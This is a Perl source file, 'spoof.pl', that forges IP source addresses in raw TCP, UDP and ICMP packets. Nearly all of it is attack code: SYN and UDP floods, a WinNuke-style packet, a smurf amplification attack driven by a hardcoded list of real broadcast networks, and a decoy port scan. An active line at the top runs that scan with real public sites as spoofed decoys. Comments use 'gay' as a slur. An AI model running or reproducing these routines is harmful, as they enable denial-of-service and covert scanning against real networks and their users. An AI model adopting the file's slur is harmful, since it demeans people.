#!/usr/bin/perl -w
#
# spoof.pl - pretty basic right now, can send basic spoofed UDP, TCP,
#  and ICMP packets.  Need to add more methods to control packet guts,
#  more options per packet type, and maybe try some TCP sequence 
#  prediction.
#
# a few functions that fling a few packets around
#
# synFlood(sourceip,desip,destport,number,message)
# your basic gay SYN flood
#
# msgOOB(sourceip,destip,destport,message)
# your basic gay winnuke - doubt this works anywhere anymore
#
# fakePortscan(destip, start port, end port, [ spoof1, spoof2, ... ], 
#    local port, optional delay in ms, optional dump file - else STDOUT)
# decently cool port scan - spoof1, spoof2, etc are spoofed IP scans.
#  the point is that your real scan will be submerged under a bunch of
#  fake ones.  Just make sure your IP is listed to catch replies, or
#  you are listening at one of the spoofed adds.
#
# smurf0r(targetip,reps,ping size)
#  the target ip is the one you are hitting with the smurf - it uses
#  a prexisting list of broadcast addresses


# spoof::tcpLis(60,1245);

# spoof::udpHose("9mm.com","CC45253-B",5099,100,"unF!");
# spoof::smurf0r("CC45253-B",10,1200,1);
spoof::fakePortscan("localhost", 1, 1000, 
	     [ "localhost", "www.microsoft.com" , "www.whitehouse.gov", ],
	        31337, 1 
	     );
# spoof::synFlood("CC45253-C","CC45253-A",21,5,"unF unF unF!" );
# spoof::msgOOB("CC45253-C","CC45253-A",21,"unF unF unF!" );


package spoof;

use Exporter;
@ISA = qw(Exporter);
@EXPORT = qw(synFlood msgOOB fakePortscan smurf0r udpHose);


sub PROTO_RAW () { 255 }; # constant definition
sub IP_HDRINCL () { 1 }; # constant definition

use Socket;


=pod
contructor function for packets;

my $spoof = new spoof(
     protocol (either UDP, TCP, or ICMP),
     protocol options ( depends on protocol),
     data ( packet data, may be null),
     ip_options ( options for the IP header, probably null)
)

the options field depends on the protocol - for TCP and UDP, it is 
an anonymous array consisting of source ip, destination ip, source port,
and destination port.  An example:

my $spoof = new (UDP, 
	    [ 1.2.3.4 , www.microsoft.com, 666, 1000 ],
		 "unF unF unF" );

this would create a spoof object that ready to send packets to microsoft.com
from ip 1.2.3.4 with the data being "unF unF unF".  Technically, the IP
addresses are part of the IP header, so they really aren't part of the 
protocol header.  However the IP headers are required for the calculation
of the pseudo-header for TCP and UDP, so they are lumped in there.  Similarly
the data is really part of the protocol section, but I'm seperating it
for practical reasons.

=cut

sub new {
    my($pack,$protocol,$options,$data,$ipoptions) = @_;

    if ($protocol =~ /tcp|^6$/i) {
	$protocol = 6;
    } elsif ($protocol =~ /udp|^17$/i) {
	$protocol = 17;
    } elsif ($protocol =~ /icmp|^1$/i) {
	$protocol = 1;
    } else {
	die "Protocol missing or not supported\n";
    }

    my $addlength = 0;
    if ($ipoptions) {
	die "IP options not implemented\n";
	$addlength = 0;
    }

    my($sourceip,$destip) = (shift(@$options),shift(@$options));
    # assumes that the first and second elements of the protocol
    # options are source and destination IP address - a good bet

    length($sourceip) == 4 or $sourceip = gethostbyname($sourceip);
    length($destip) == 4 or $destip = gethostbyname($destip);
    # pack the source-dest ips into network byte format

    my $proto_head = { }; # this will have protocol specific options

    my $ip_head = { # ip header options
	-proto => $protocol,
	-version => "4",
	-IHL => 5 + $addlength,
	-tos => "00000000",
	-flags => "000",
	-ident => rand(30000) + 10000,
	-ttl => 64,
	-source => $sourceip,
	-dest => $destip,
	-phead => $proto_head
	};

    if ($protocol == 17) { 
	my($sourceport,$destport) = @$options;
	$proto_head->{-sport} = $sourceport;
	$proto_head->{-dport} = $destport;
	$proto_head->{-data} = $data;
    } elsif ($protocol == 1) {
	my($type) = @$options;
	$proto_head->{-type} = $type;
	$proto_head->{-seq} = 0;
	$proto_head->{-data} = $data;
	unless ($type =~ /^(8)$/) {
	    die "Unimplemented ICMP type\n";
	}
    } elsif ($protocol == 6) {
	my($sourceport,$destport) = @$options;
	$proto_head->{-sport} = $sourceport; # source/dest ports
	$proto_head->{-dport} = $destport;
	$proto_head->{-URG} = 0; # flag bits
	$proto_head->{-ACK} = 0;
	$proto_head->{-PSH} = 0;
	$proto_head->{-RST} = 0;
	$proto_head->{-SYN} = 1; # set for initial connection
	$proto_head->{-FIN} = 0;
	$proto_head->{-headlen} = 5; # words in header (no options)
	$proto_head->{-sequence} = rand(2 ** 32); # some initial seq num
	$proto_head->{-acknum} = 0; # acknowledgement number
	$proto_head->{-window} = 4096; # window size
	$proto_head->{-urgent} = 0; # urgent pointer
	$proto_head->{-data} = $data;
    } 

    buildPacket($ip_head);
    return(bless($ip_head,$pack));
}

sub buildPacket {
    my $pr = shift;

    # build proto-specific packet first
    my $proto_packet;

    if ($pr->{-proto} == 17) { # udp
	my $octets = 8 + length( $pr->{-phead}{-data}); 
        # udp length = 8 header bytes + data
	
	my $pseudo_udp = pack('A4 
                               A4
                               C C  n
                               n    n
                               n    n
                                ',
			      $pr->{-source},
			      $pr->{-dest},
			      0, 17, $octets,
			      $pr->{-phead}{-sport}, $pr->{-phead}{-dport},
			      $octets, 0);

	$pseudo_udp .= $pr->{-phead}{-data};

	# create the UDP pseudo-header for checksum calculation - note that
	#  the source-destination IP addresses are included, which seems
	#  redundant to me since its in the IP header - oh well

	length($pseudo_udp) % 2 and $pseudo_udp .= chr(0);
	# add an extra 8 bits if necessary to complete 16 bit word for checksum

	my $p_sum = calcChecksum($pseudo_udp);
        # get checksum

	$proto_packet = pack('n n
                            n A2',
			   $pr->{-phead}{-sport}, $pr->{-phead}{-dport},
			   $octets,$p_sum);
	# make the UDP header

	$proto_packet .= $pr->{-phead}{-data};

    } elsif ($pr->{-proto} == 1) {
	my $seq = $pr->{-phead}{-sequence}++;
	$proto_packet = pack('
                                C C n
                                n   n',
			       $pr->{-phead}{-type}, 0, 0,
			       $$, $seq ) . $pr->{-phead}{-data};
	
	my $psuedo_icmp;

	length($proto_packet) % 2 ?
	    $pseudo_icmp = $proto_packet . chr(0) :
		$pseudo_icmp = $proto_packet;

	my $icmp_check = calcChecksum($pseudo_icmp);
	substr($proto_packet,2,2) = $icmp_check;
                           
    } elsif ($pr->{-proto} == 6) {

	my $octets = 20 + length( $pr->{-phead}{-data} ); 

	# assuming no options

	my $pseudo_header = pack('A4 
                               A4
                               C C  n',
			      $pr->{-source},
			      $pr->{-dest},
			      0, 6, $octets);


	my $flg_bits = pack('H B8', $pr->{-phead}{-headlen},
	"00" . $pr->{-phead}{-URG} . $pr->{-phead}{-ACK} . 
	    $pr->{-phead}{-PSH} . $pr->{-phead}{-RST} . 
		$pr->{-phead}{-SYN} . $pr->{-phead}{-FIN} );

	$proto_packet = pack('n n
                              l
                              l
	                      A2  n
                              n   n',
                              
			     $pr->{-phead}{-sport}, $pr->{-phead}{-dport},
			     $pr->{-phead}{-sequence}, 
			     $pr->{-phead}{-acknum},
			     $flg_bits, $pr->{-phead}{-window},
			     0,  $pr->{-phead}{-urgent},
			     $octets, 0) . $pr->{-phead}{-data};

	my $tmp_packet = $pseudo_header . $proto_packet;
	length($tmp_packet) % 2 and $tmp_packet .= chr(0);

	my $tcp_check = calcChecksum($tmp_packet);
	substr($proto_packet,16,2) = $tcp_check;
    } else {
	die "Cant construct unimplemented packet\n";
    }

    # $proto_packet has tcp, udp, or ICMP packet
  
    my $length = $pr->{-IHL} * 4 + length($proto_packet); 
    my $identification = $pr->{-ident}++;
    my $allflags = $pr->{-flags} . "0" x 13;

    my $checksum = 0; # for pseudo-header checksum calculation

    my $ipheader = pack('C 
                             B8 n
                             n B16
                             C C n
                              A4
                              A4
                             ',
			($pr->{-version} << 4) | $pr->{-IHL},
			$pr->{-tos} , $length,
			$identification, $allflags,
			$pr->{-ttl} , $pr->{-proto} , $checksum,
			$pr->{-source},
			$pr->{-dest},
			);

	# make the IP header with 0 checksum

    my $newcheck = calcChecksum($ipheader); # calculate the checksum
    substr($ipheader,10,2) = $newcheck;     # insert correct checksum
    
    my $final_header = $ipheader . $proto_packet;
 
#   binDebug($final_header);

    $pr->{-constructed} = $final_header;
}


sub sendPacket {
    my($pr,$type) = @_;

    my $flags = 0;


    socket(SOCK, AF_INET, SOCK_RAW, PROTO_RAW) or die "ERROR: $!";
    # what this means:
    #  SOCK - handle for socket operations (can be any word)
    #  AF_INET - make it an internet socket (not unix domain)
    #  SOCK_RAW - raw interface, as opposed to TCP or UDP
    #  PROTO_RAW - specific protocol, see /etc/protocols for list


    if ($pr->{-proto} == 1) { # perhaps ICMP should be handled differently?
	my $sendadd = pack('S n A4 x8', AF_INET, 
			   0, $pr->{-dest}
			   );
	# packed address - layer, port, IP, then some padding (x8)
	send (SOCK, $pr->{-constructed}, 0, $sendadd) or die "SEND ERROR: $!";


    } else {

	setsockopt(SOCK, SOL_SOCKET, IP_HDRINCL, 1) or die "Cant set $!\n";
	my $sendadd = pack('S n A4 x8', AF_INET, 
			   $pr->{-phead}{-dport}, $pr->{-dest}
			   );
	# packed address - layer, port, IP, then some padding (x8)

	send (SOCK, $pr->{-constructed}, $flags, $sendadd) or die "SEND ERROR: $!";
    }   
}



sub calcChecksum {
    my $msg = shift;
    my($tot,$word,$tmp);
    while($word = substr($msg,0,2)) {
	substr($msg,0,2) = '';	
	$tot += unpack('n',$word); # add up all the unpacked 16 bit values
    }
    my $back = pack('n',$tot % 65535); # take the mod via 2^16 - 1 and repack
    return(~$back); # return the complement
}

=pod
Two useful debugging functions for dumping packed data, organized into
4 8-bit words per line
=cut

sub binDebug {
    my $data = shift;
    my $counter = 1;
    print "Binary Octet Dump:\n";
    for (my $i = 0;$i < length($data);$i += 4) {
	print "$counter: " . 
	    join(' ',unpack('B8 B8 B8 B8',substr($data,$i,4))) . "\n";
	$counter++;
    }
}

sub hexDebug {
    my $data = shift;
    my $counter = 1;
    print "Hex Dump:\n";
    for (my $i = 0;$i < length($data);$i += 4) {
	print "$counter: " . 
	    join(' ',unpack('H2 H2 H2 H2',substr($data,$i,4))) . "\n";
	$counter++;
    }
}




sub synFlood {
    my($source,$dest,$destport,$reps,$message) = @_;
    
    $spoof = new spoof (TCP, 
	[ $source, $dest, rand(10000) + 2000 , $destport ],
		 "uNF uNF uNF!" );

    $spoof->{-phead}{-SYN} = 1;
    $spoof->{-phead}{-ACK} = 0;
    $spoof->buildPacket();

    for (my $i = 1;$i <= $reps;$i++) {
	$spoof->sendPacket();
    }
}

sub msgOOB {
    my($source,$dest,$destport,$message) = @_;
    
    $spoof = new spoof (TCP, 
	[ $source, $dest, rand(10000) + 2000 , $destport ],
		 "uNF uNF uNF!" );

    $spoof->{-phead}{-URG} = 1;
    $spoof->{-phead}{-SYN} = 0;
    $spoof->buildPacket();

    $spoof->sendPacket();
   
}

BEGIN {
    my $myref = sub { print @_ };
    sub myprint {
	(ref($_[0]) eq CODE) ? $myref = $_[0] : &$myref(@_); 
    }
}

sub fakePortscan {
    my($dest,$lowport,$hiport,$sources,$localport,$ms,$output) = @_;

    my $coderef;
    local(*OUTPUT);
    if ($output) {
	unlink($output);
	$coderef = sub {
	    open(OUTPUT,">>$output");
	    print OUTPUT @_;
	    close(OUTPUT);
	};
    } else {
	$coderef = sub { print @_; };
    }
  
    myprint ($coderef); # load up the ref

    myprint "Initiating portscan to $dest: $lowport->$hiport ($ms ms)\n";

    $ms ||= 0;
    $ms /= 1000;

    $localport ||= int(rand(20000) + 10000);
	

    $kid = sniffit($localport);

    length($dest) == 4 or $dest = gethostbyname($dest);

    my @bin_sources;
    foreach (@$sources) {
	if (length() == 4) {
	    push(@bin_sources, $_);
	} else {
	    $tmp = gethostbyname($_);
	    $tmp && push(@bin_sources, $tmp);
	} 
    }


    myprint "Source ip: " . join('.',unpack('C4',$_)) . "\n"
	foreach (@bin_sources);

   
    for (my $i = $lowport; $i <= $hiport; $i++) {
#	print "Scanning $i\n";
	foreach $source (@bin_sources) {
	    $spoof = new spoof (TCP, 
		      [ $source, $dest, $localport , $i ],
				"uNF uNF uNF!" );
	    $spoof->sendPacket();
	    select(undef,undef,undef,$ms);
	}
    }
    myprint "Waiting additional 10 sec for responces...\n";
    sleep(10);
    kill(10,$kid);
    myprint "Scan complete\n";
    $oldhan and select($oldhan);
}




sub sniffit {
    my $localport = shift;
    my $kid = fork();
    $kid && return $kid;

    socket(LSOCK, AF_INET, SOCK_RAW, 6) || die "Can't create sock: $!";

    $SIG{USR1} = sub { shutdown(LSOCK,2); exit; };

    while(recv(LSOCK,$packet,4096,0)) {
	$tmp = unpack('C',substr($packet,9,1));
	if ($tmp == 6) { # TCP
	    my $lport = unpack('n',substr($packet,22,2));
	    next unless $lport == $localport;
	    $flags = unpack('B8', substr($packet,33,1));
	    @tmp = split('',$flags);
	    if (($tmp[3]) and ($tmp[6])) {
		    my $hport = unpack('n',substr($packet,20,2));
		    my $hip = join('.', unpack('C4',substr($packet,12,4)));
		    myprint "Port $hip:$hport open\n";
	    }
	}
    }   
}

sub smurf0r {
    my($victim,$reps,$size,$debug) = @_;
    
    $debug and $kid = icmpsniff(); # if you want to measure smurf effect

    length($victim) == 4 or $victim = gethostbyname($victim);

    $data = "unF" x ($size / 3) . "!" x ($size % 3);

    for (my $i = 1;$i <= $reps; $i++) {
	print "Round $i\n";
	foreach $amp (@amps) {
	    $spoof = new spoof (ICMP,
			  [ $victim, $amp, 8 ],
			  $data );
	    $spoof->sendPacket();
#	    select(undef,undef,undef,".1");
	}
    }

    if ($debug) { $kid and kill(10,$kid); }
}



sub icmpsniff {
    my $kid = fork();
    $kid && return $kid;

    print "ICMP sniffer\n";
    socket(LSOCK, AF_INET, SOCK_RAW, 1) || die "Can't create sock: $!";
    $SIG{USR1} = sub { shutdown(LSOCK,2); exit; };

    my $r;
    while(recv(LSOCK,$packet,4096,0)) {
	$i++;
	$tot += length($packet);
	$r++ % 50 or print "Got ICMP $i - $tot \n";
    }   
}


BEGIN {
    if (-r "broadcast.txt") {
	open(IN,"broadcast.txt"); 
	while(<IN>) { 
	    chomp; 
	    @_ = split; 
	    push(@amps,$_[0]);
	}
    } else {
	@amps = qw(
		   209.213.205.0
		   208.211.250.0
		   209.140.163.0
		   207.177.41.0
		   209.47.203.0
		   216.94.12.0
		   208.129.177.255
		   203.38.29.0
		   209.140.163.255
		   24.217.1.255
		   193.14.29.0
		   193.74.176.0
		   193.52.147.0
		   193.52.147.255
		   207.177.41.255
		   216.102.245.0
		   216.146.128.255
		   204.181.85.255
		   24.217.0.255
		   205.154.156.255
		   );
    }

    foreach (@amps) {
	length == 4 or $_ = gethostbyname($_);
    }

}

sub mysteryPacket {
    my($source,$dest,$destport,$message) = @_;
    
    $spoof = new spoof (TCP, 
	[ $source, $dest, rand(10000) + 2000 , $destport ],
		 "uNF uNF uNF!" );

    $spoof->{-version} = 10;
    $spoof->{-flags} = "101";
    $spoof->{-tos} = "01101001";

    $spoof->{-phead}{-URG} = 1;
    $spoof->{-phead}{-SYN} = 1;
    $spoof->{-phead}{-RST} = 1;
    $spoof->{-phead}{-FIN} = 1;
    $spoof->{-phead}{-PSH} = 1;
    $spoof->{-phead}{-ACK} = 1;
    $spoof->buildPacket();
    $spoof->sendPacket();   
}

sub udpHose {
    my($source,$destip,$destport,$numpacks,$data) = @_;

    unless ($source eq "RAND") {
	length($source) == 4 or $source = gethostbyname($source);
    }

    length($destip) == 4 or $destip = gethostbyname($destip);



    my $sendip;
    for (my $i = 1;$i <= $numpacks;$i++) {
	if ($source eq "RAND") {
	    $sendip = randip() ;
#	    print join(' ',unpack('C4',$sendip));
	} else {
	    $sendip = $source;
	}

	$spoof = new spoof (UDP, 
	      [ $sendip, $destip, rand(10000) + 2000 , $destport ],
		 $data );

	$spoof->sendPacket();

    }
}

sub randip {
    return( pack('C4',
	       int(rand(255)),
	       int(rand(255)),
	       int(rand(255)),
	       int(rand(255))
		 )
	    );
}


sub tcpLis {
    my($time,$port) = @_;
    $kid = sniffit($port);
    sleep($time);
    kill(10,$kid);
}





